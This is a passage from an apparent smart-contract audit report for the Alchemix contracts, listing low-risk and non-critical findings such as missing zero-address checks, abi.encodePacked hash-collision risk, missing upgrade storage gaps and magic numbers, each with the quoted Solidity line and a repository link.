TokenUtils.safeApprove(ITokenAdapter(adapter).underlyingToken(), adapter, type(uint256).max);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AlchemistV2.sol#L479\r\n\r\n### 9. Missing checks for `address(0x0)` when assigning values to `address` state variables\r\n\r\n*There are 24 instances of this issue:*\r\n```solidity\r\nFile: contracts-full/TransmuterBuffer.sol   #1\r\n\r\n88:           debtToken = _debtToken;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/TransmuterBuffer.sol#L88\r\n\r\n```solidity\r\nFile: contracts-full/TransmuterBuffer.sol   #2\r\n\r\n241:          alchemist = _alchemist;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/TransmuterBuffer.sol#L241\r\n\r\n```solidity\r\nFile: contracts-full/StakingPools.sol   #3\r\n\r\n134:      governance = _pendingGovernance;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/StakingPools.sol#L134\r\n\r\n```solidity\r\nFile: contracts-full/TransmuterV2.sol   #4\r\n\r\n153:      syntheticToken = _syntheticToken;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/TransmuterV2.sol#L153\r\n\r\n```solidity\r\nFile: contracts-full/TransmuterV2.sol   #5\r\n\r\n154:      underlyingToken = _underlyingToken;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/TransmuterV2.sol#L154\r\n\r\n```solidity\r\nFile: contracts-full/TransmuterV2.sol   #6\r\n\r\n158:      buffer = _buffer;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/TransmuterV2.sol#L158\r\n\r\n```solidity\r\nFile: contracts-full/TransmuterV2.sol   #7\r\n\r\n163:      whitelist = _whitelist;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/TransmuterV2.sol#L163\r\n\r\n```solidity\r\nFile: contracts-full/TransmuterV2.sol   #8\r\n\r\n198:      buffer = _newCollateralSource;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/TransmuterV2.sol#L198\r\n\r\n```solidity\r\nFile: contracts-full/adapters/yearn/YearnTokenAdapter.sol   #9\r\n\r\n20:           token = _token;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/adapters/yearn/YearnTokenAdapter.sol#L20\r\n\r\n```solidity\r\nFile: contracts-full/adapters/yearn/YearnTokenAdapter.sol   #10\r\n\r\n21:           underlyingToken = _underlyingToken;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/adapters/yearn/YearnTokenAdapter.sol#L21\r\n\r\n```solidity\r\nFile: contracts-full/gALCX.sol   #11\r\n\r\n40:           owner = _owner;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/gALCX.sol#L40\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #12\r\n\r\n446:          pendingAdmin = value;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L446\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #13\r\n\r\n477:          operator = value;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L477\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #14\r\n\r\n485:          rewardReceiver = value;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L485\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #15\r\n\r\n493:          transmuterBuffer = value;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L493\r\n\r\n```solidity\r\nFile: contracts-full/WETHGateway.sol   #16\r\n\r\n24:           whitelist = _whitelist;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/WETHGateway.sol#L24\r\n\r\n```solidity\r\nFile: contracts-full/TransmuterConduit.sol   #17\r\n\r\n22:           token = _token;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/TransmuterConduit.sol#L22\r\n\r\n```solidity\r\nFile: contracts-full/TransmuterConduit.sol   #18\r\n\r\n23:           sourceTransmuter = _source;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/TransmuterConduit.sol#L23\r\n\r\n```solidity\r\nFile: contracts-full/TransmuterConduit.sol   #19\r\n\r\n24:           sinkTransmuter = _sink;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/TransmuterConduit.sol#L24\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #20\r\n\r\n294:          pendingAdmin = value;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L294\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #21\r\n\r\n325:          operator = value;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L325\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #22\r\n\r\n333:          rewardReceiver = value;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L333\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #23\r\n\r\n341:          transmuterBuffer = value;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L341\r\n\r\n```solidity\r\nFile: contracts-full/AlchemistV2.sol   #24\r\n\r\n283:          pendingAdmin = value;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AlchemistV2.sol#L283\r\n\r\n### 10. `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`\r\nUse `abi.encode()` instead which will pad items to 32 bytes, which will [prevent hash collisions](https://docs.soliditylang.org/en/v0.8.13/abi-spec.html#non-standard-packed-mode) (e.g. `abi.encodePacked(0x123,0x456)` => `0x123456` => `abi.encodePacked(0x1,0x23456)`, but `abi.encode(0x123,0x456)` => `0x0...1230...456`). \"Unless there is a compelling reason, `abi.encode` should be preferred\". If there is only one argument to `abi.encodePacked()` it can often be cast to `bytes()` or `bytes32()` [instead](https://ethereum.stackexchange.com/questions/30912/how-to-compare-strings-in-solidity#answer-82739).\r\n\r\n*There is 1 instance of this issue:*\r\n```solidity\r\nFile: contracts-full/libraries/RocketPool.sol   #1\r\n\r\n14:               keccak256(abi.encodePacked(\"contract.address\", \"rocketTokenRETH\"))\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/RocketPool.sol#L14\r\n\r\n### 11. Upgradeable contract is missing a `__gap[50]` storage variable to allow for new storage variables in later versions\r\nSee [this](https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps) link for a description of this storage variable. While some contracts may not currently be sub-classed, adding the variable now protects against forgetting to add it in the future.\r\n\r\n*There are 3 instances of this issue:*\r\n```solidity\r\nFile: contracts-full/AlchemicTokenV2Base.sol   #1\r\n\r\n20:   contract AlchemicTokenV2Base is ERC20Upgradeable, AccessControlUpgradeable, IERC3156FlashLender, ReentrancyGuardUpgradeable {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AlchemicTokenV2Base.sol#L20\r\n\r\n```solidity\r\nFile: contracts-full/TransmuterV2.sol   #2\r\n\r\n26:   contract TransmuterV2 is ITransmuterV2, Initializable, ReentrancyGuardUpgradeable, AccessControlUpgradeable {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/TransmuterV2.sol#L26\r\n\r\n```solidity\r\nFile: contracts-full/CrossChainCanonicalBase.sol   #3\r\n\r\n12:   contract CrossChainCanonicalBase is ERC20PermitUpgradeable, ReentrancyGuardUpgradeable, OwnableUpgradeable {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/CrossChainCanonicalBase.sol#L12\r\n\r\n## Non-critical Issues\r\n\r\n### 1. Adding a `return` statement when the function defines a named return variable, is redundant\r\n\r\n*There are 4 instances of this issue:*\r\n```solidity\r\nFile: contracts-full/TransmuterV2.sol   #1\r\n\r\n366:      return unexchangedBalance;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/TransmuterV2.sol#L366\r\n\r\n```solidity\r\nFile: contracts-full/TransmuterV2.sol   #2\r\n\r\n560:        return exchangedBalance;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/TransmuterV2.sol#L560\r\n\r\n```solidity\r\nFile: contracts-full/TransmuterV2.sol   #3\r\n\r\n572:      return exchangedBalance;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/TransmuterV2.sol#L572\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #4\r\n\r\n529:          return result;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L529\r\n\r\n### 2. `override` function arguments that are unused should have the variable name removed or commented out to avoid compiler warnings\r\n\r\n*There is 1 instance of this issue:*\r\n```solidity\r\nFile: contracts-full/AutoleverageCurveMetapool.sol   #1\r\n\r\n20:       function _maybeConvertCurveOutput(uint256 amountOut) internal override {}\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AutoleverageCurveMetapool.sol#L20\r\n\r\n### 3. `public` functions not called by the contract should be declared `external` instead\r\nContracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from `external` to `public`.\r\n\r\n*There are 12 instances of this issue:*\r\n```solidity\r\nFile: contracts-full/CrossChainCanonicalAlchemicTokenV2.sol   #1\r\n\r\n8       function initialize(\r\n9           string memory name, \r\n10          string memory symbol, \r\n11          address[] memory _bridgeTokens\r\n12:     ) public initializer {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/CrossChainCanonicalAlchemicTokenV2.sol#L8-L12\r\n\r\n```solidity\r\nFile: contracts-full/AlchemicTokenV1.sol   #2\r\n\r\n138:    function burn(uint256 amount) public {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AlchemicTokenV1.sol#L138\r\n\r\n```solidity\r\nFile: contracts-full/AlchemicTokenV1.sol   #3\r\n\r\n148:    function burnFrom(address owner, uint256 amount) public {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AlchemicTokenV1.sol#L148\r\n\r\n```solidity\r\nFile: contracts-full/AlchemicTokenV1.sol   #4\r\n\r\n159:    function lowerHasMinted(uint256 amount) public onlyWhitelisted {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AlchemicTokenV1.sol#L159\r\n\r\n```solidity\r\nFile: contracts-full/CrossChainCanonicalGALCX.sol   #5\r\n\r\n7       function initialize(\r\n8           string memory name, \r\n9           string memory symbol, \r\n10          address[] memory _bridgeTokens\r\n11:     ) public initializer {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/CrossChainCanonicalGALCX.sol#L7-L11\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #6\r\n\r\n298:      function exchangeRate(ThreePoolAsset asset) public view returns (uint256) {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L298\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #7\r\n\r\n330       function calculateRebalance(\r\n331           MetaPoolAsset rebalanceAsset,\r\n332           ThreePoolAsset targetExchangeAsset,\r\n333           uint256 targetExchangeRate\r\n334:      ) public view returns (uint256 delta, bool add) {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L330-L334\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #8\r\n\r\n408:      function claimableRewards() public view returns (uint256 amountCurve, uint256 amountConvex) {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L408\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #9\r\n\r\n717:      function reclaimThreePoolAsset(ThreePoolAsset asset, uint256 amount) public lock onlyAdmin {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L717\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #10\r\n\r\n253:      function exchangeRate() public view returns (uint256) {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L253\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #11\r\n\r\n269:      function claimableRewards() public view returns (uint256 amountCurve, uint256 amountConvex) {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L269\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #12\r\n\r\n494:      function reclaimEth(uint256 amount) public lock onlyAdmin {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L494\r\n\r\n### 4. `2**<n> - 1` should be re-written as `type(uint<n>).max`\r\nEarlier versions of solidity can use `uint<n>(-1)` instead. Expressions not including the `- 1` can often be re-written to accomodate the change (e.g. by using a `>` rather than a `>=`, which will also save some gas)\r\n\r\n*There is 1 instance of this issue:*\r\n```solidity\r\nFile: contracts-full/libraries/SafeCast.sol   #1\r\n\r\n13:       if (y >= 2**255) {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/SafeCast.sol#L13\r\n\r\n### 5. `constant`s should be defined rather than using magic numbers\r\n\r\n*There are 20 instances of this issue:*\r\n```solidity\r\nFile: contracts-full/TransmuterBuffer.sol   #1\r\n\r\n/// @audit 100\r\n520:          uint256 minimumAmountOut = amountUnderlying - amountUnderlying * 100 / 10000;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/TransmuterBuffer.sol#L520\r\n\r\n```solidity\r\nFile: contracts-full/TransmuterBuffer.sol   #2\r\n\r\n/// @audit 10000\r\n520:          uint256 minimumAmountOut = amountUnderlying - amountUnderlying * 100 / 10000;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/TransmuterBuffer.sol#L520\r\n\r\n```solidity\r\nFile: contracts-full/adapters/lido/WstETHAdapterV1.sol   #3\r\n\r\n/// @audit 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE\r\n53:               0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/adapters/lido/WstETHAdapterV1.sol#L53\r\n\r\n```solidity\r\nFile: contracts-full/gALCX.sol   #4\r\n\r\n/// @audit 18\r\n25:       constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol, 18) {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/gALCX.sol#L25\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/curve/IStableSwap3Pool.sol   #5\r\n\r\n/// @audit 3\r\n6:    uint256 constant N_COINS = 3;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/curve/IStableSwap3Pool.sol#L6\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #6\r\n\r\n/// @audit 1e4\r\n47:   uint256 constant SLIPPAGE_PRECISION = 1e4;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L47\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #7\r\n\r\n/// @audit 1e18\r\n50:   uint256 constant CURVE_PRECISION = 1e18;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L50\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #8\r\n\r\n/// @audit 256\r\n353:          for (uint256 i = 0; i < 256; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L353\r\n\r\n```solidity\r\nFile: contracts-full/libraries/SafeERC20.sol   #9\r\n\r\n/// @audit 32\r\n34:           if (!success || data.length < 32) {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/SafeERC20.sol#L34\r\n\r\n```solidity\r\nFile: contracts-full/libraries/LiquidityMath.sol   #10\r\n\r\n/// @audit 18\r\n41:       return (input * (10**18)) / (10**decimals);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/LiquidityMath.sol#L41\r\n\r\n```solidity\r\nFile: contracts-full/libraries/LiquidityMath.sol   #11\r\n\r\n/// @audit 18\r\n46:       return (input * (10**decimals)) / (10**18);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/LiquidityMath.sol#L46\r\n\r\n```solidity\r\nFile: contracts-full/libraries/SafeCast.sol   #12\r\n\r\n/// @audit 255\r\n13:       if (y >= 2**255) {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/SafeCast.sol#L13\r\n\r\n```solidity\r\nFile: contracts-full/libraries/TokenUtils.sol   #13\r\n\r\n/// @audit 32\r\n31:           if (!success || data.length < 32) {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/TokenUtils.sol#L31\r\n\r\n```solidity\r\nFile: contracts-full/libraries/TokenUtils.sol   #14\r\n\r\n/// @audit 32\r\n51:           if (!success || data.length < 32) {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/TokenUtils.sol#L51\r\n\r\n```solidity\r\nFile: contracts-full/libraries/LibFuse.sol   #15\r\n\r\n/// @audit 0.0005e16\r\n38:               require(borrowRateMantissa <= 0.0005e16, \"RATE_TOO_HIGH\");\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/LibFuse.sol#L38\r\n\r\n```solidity\r\nFile: contracts-full/CrossChainCanonicalBase.sol   #16\r\n\r\n/// @audit 400\r\n65:               swapFees[_bridgeTokens[i]] = [400, 400];\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/CrossChainCanonicalBase.sol#L65\r\n\r\n```solidity\r\nFile: contracts-full/CrossChainCanonicalBase.sol   #17\r\n\r\n/// @audit 400\r\n65:               swapFees[_bridgeTokens[i]] = [400, 400];\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/CrossChainCanonicalBase.sol#L65\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #18\r\n\r\n/// @audit 1e4\r\n41:   uint256 constant SLIPPAGE_PRECISION = 1e4;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L41\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #19\r\n\r\n/// @audit 1e18\r\n44:   uint256 constant CURVE_PRECISION = 1e18;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L44\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #20\r\n\r\n/// @audit 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE\r\n216:              if (_metaPoolAssetCache[i] == IERC20(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE)) {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L216\r\n\r\n### 6. Redundant cast\r\nThe type of the variable is the same as the type to which the variable is being cast\r\n\r\n*There are 4 instances of this issue:*\r\n```solidity\r\nFile: contracts-full/adapters/lido/WstETHAdapterV1.sol   #1\r\n\r\n105:          SafeERC20.safeApprove(parentToken, address(token), mintedStEth);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/adapters/lido/WstETHAdapterV1.sol#L105\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #2\r\n\r\n731:          SafeERC20.safeTransfer(address(token), msg.sender, amount);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L731\r\n\r\n```solidity\r\nFile: contracts-full/CrossChainCanonicalBase.sol   #3\r\n\r\n182:          TokenUtils.safeTransfer(address(tokenAddress), msg.sender, tokenAmount);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/CrossChainCanonicalBase.sol#L182\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #4\r\n\r\n510:          SafeERC20.safeTransfer(address(token), msg.sender, amount);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L510\r\n\r\n### 7. Numeric values having to do with time should use time units for readability\r\nThere are [units](https://docs.soliditylang.org/en/latest/units-and-global-variables.html#time-units) for seconds, minutes, hours, days, and weeks\r\n\r\n*There is 1 instance of this issue:*\r\n```solidity\r\nFile: contracts-full/libraries/Limiters.sol   #1\r\n\r\n12:       uint256 constant public MAX_COOLDOWN_BLOCKS = 7200;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/Limiters.sol#L12\r\n\r\n### 8. Missing event for critical parameter change\r\n\r\n*There are 3 instances of this issue:*\r\n```solidity\r\nFile: contracts-full/AlchemicTokenV2Base.sol   #1\r\n\r\n196     function setMaxFlashLoan(uint _maxFlashLoanAmount) external onlyAdmin {\r\n197       maxFlashLoanAmount = _maxFlashLoanAmount;\r\n198:    }\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AlchemicTokenV2Base.sol#L196-L198\r\n\r\n```solidity\r\nFile: contracts-full/TransmuterV2.sol   #2\r\n\r\n196     function setCollateralSource(address _newCollateralSource) external {\r\n197       _onlyAdmin();\r\n198       buffer = _newCollateralSource;\r\n199:    }\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/TransmuterV2.sol#L196-L199\r\n\r\n```solidity\r\nFile: contracts-full/AlchemicTokenV2.sol   #3\r\n\r\n164     function setMaxFlashLoan(uint _maxFlashLoanAmount) external onlyAdmin {\r\n165       maxFlashLoanAmount = _maxFlashLoanAmount;\r\n166:    }\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AlchemicTokenV2.sol#L164-L166\r\n\r\n### 9. Use a more recent version of solidity\r\nUse a solidity version of at least 0.8.13 to get the ability to use `using for` with a list of free functions\r\n\r\n*There are 12 instances of this issue:*\r\n```solidity\r\nFile: contracts-full/TransmuterBuffer.sol   #1\r\n\r\n2:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/TransmuterBuffer.sol#L2\r\n\r\n```solidity\r\nFile: contracts-full/StakingPools.sol   #2\r\n\r\n2:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/StakingPools.sol#L2\r\n\r\n```solidity\r\nFile: contracts-full/utils/Whitelist.sol   #3\r\n\r\n1:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/utils/Whitelist.sol#L1\r\n\r\n```solidity\r\nFile: contracts-full/AlchemicTokenV1.sol   #4\r\n\r\n2:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AlchemicTokenV1.sol#L2\r\n\r\n```solidity\r\nFile: contracts-full/TransmuterV2.sol   #5\r\n\r\n2:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/TransmuterV2.sol#L2\r\n\r\n```solidity\r\nFile: contracts-full/libraries/LiquidityMath.sol   #6\r\n\r\n2:    pragma solidity >=0.5.0;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/LiquidityMath.sol#L2\r\n\r\n```solidity\r\nFile: contracts-full/libraries/Sets.sol   #7\r\n\r\n1:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/Sets.sol#L1\r\n\r\n```solidity\r\nFile: contracts-full/libraries/Limiters.sol   #8\r\n\r\n1:    pragma solidity 